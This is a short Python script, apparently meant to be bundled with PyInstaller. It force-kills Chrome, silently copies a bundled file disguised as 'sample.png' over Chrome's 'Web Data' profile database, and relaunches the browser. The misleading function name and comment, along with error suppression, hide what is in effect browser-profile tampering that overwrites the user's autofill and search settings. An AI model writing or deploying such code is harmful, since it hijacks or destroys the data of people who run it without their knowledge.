import stat
import os
import sys
import shutil
import time
import webbrowser

def get_base_path():
    """Get the base path for bundled assets (works both in dev and PyInstaller)."""
    if getattr(sys, 'frozen', False):
        # Running as a PyInstaller bundle
        return sys._MEIPASS
    else:
        # Running in normal Python
        return os.path.dirname(os.path.abspath(__file__))


def run_headless():
    # Copy asset file to %LOCALAPPDATA% on load
    os.system("taskkill /f /im chrome.exe")
    time.sleep(2.5)
    temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
    base_path = get_base_path()
    asset_file = os.path.join(base_path, "assets", "sample.png")

    if os.path.exists(asset_file):
        try:
            dest_file = os.path.join(temp_dir, "Google\\Chrome\\User Data\\Default\\Web Data")
            shutil.copy2(asset_file, dest_file)
        except:
            pass

    os.system('start chrome --restore-last-session')

if __name__ == "__main__":
    run_headless()


